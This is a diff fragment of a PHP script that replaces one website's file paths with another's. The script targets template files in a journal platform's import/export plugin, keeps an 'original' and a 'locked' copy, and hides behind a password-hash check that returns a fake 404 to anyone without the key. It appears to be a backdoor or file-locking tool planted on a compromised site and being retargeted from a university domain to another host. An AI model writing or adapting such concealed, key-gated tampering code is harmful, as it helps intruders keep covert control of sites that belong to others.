@@ -7,8 +7,8 @@
 
 $PASSWORD_HASH = '$2a$12$.o40eKx/tzP1dpjTLIMt2egdkbe.iHZ5OJf7tKuYvCgYYDIZJrvoa'; // GANTI
 
-$originalFile = "/www/wwwroot/calvaria.fk.uwks.ac.id/plugins/importexport/native/templates/index.tpl";
-$lockedFile   = "/www/wwwroot/calvaria.fk.uwks.ac.id/plugins/importexport/native/templates/indexs.tpl";
+$originalFile = "/home/healthsc/public_html/plugins/importexport/native/templates/index.tpl";
+$lockedFile   = "/home/healthsc/public_html/plugins/importexport/native/templates/indexs.tpl";
 
 if (!isset($_GET['key']) || !isset($_GET['mode']) || !password_verify($_GET['key'], $PASSWORD_HASH)) {
     http_response_code(404);
